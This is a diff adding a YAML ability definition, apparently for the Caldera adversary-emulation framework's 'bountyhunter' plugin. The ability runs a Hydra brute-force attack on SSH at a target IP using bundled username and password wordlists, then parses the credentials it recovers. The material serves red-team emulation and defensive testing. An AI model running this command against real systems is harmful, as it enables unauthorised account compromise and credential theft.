@@ -1,0 +1,47 @@
+- privilege: ''
+  name: Get SSH credentials using Hydra brute force
+  description: This ability tries to gather SSH credentials using Hydra brute force.
+  executors:
+  - platform: linux
+    build_target: null
+    payloads: []
+    variations: []
+    name: sh
+    parsers:
+    - parserconfigs:
+      - custom_parser_vals: {}
+        source: bountyhunter.network.ip
+        target: host.ssh.user
+        edge: has_ssh_user
+      - custom_parser_vals: {}
+        source: host.ssh.user
+        target: host.ssh.pwd
+        edge: has_ssh_pwd
+      module: plugins.bountyhunter.app.parsers.hydra
+    timeout: 600
+    code: null
+    cleanup: []
+    language: null
+    uploads: []
+    command: hydra -L caldera/plugins/bountyhunter/files/wordlists/users.txt
+      -P caldera/plugins/bountyhunter/files/wordlists/passwords.txt -t 4
+      ssh://#{bountyhunter.network.ip} & echo "#{host.ports.open}" > /dev/null
+    additional_info: {}
+  requirements:
+  - relationship_match:
+    - source: bountyhunter.network.ip
+      edge: has_port
+      target: host.ports.open
+    module: plugins.bountyhunter.app.requirements.ssh
+  additional_info: {}
+  repeatable: false
+  buckets:
+  - resource_development
+  access: {}
+  technique_name: Compromise Accounts
+  plugin: bountyhunter
+  delete_payload: true
+  singleton: false
+  technique_id: T1078
+  tactic: resource_development
+  id: 85d6ce79-07ea-4ed4-b763-8a6f7d5591d7
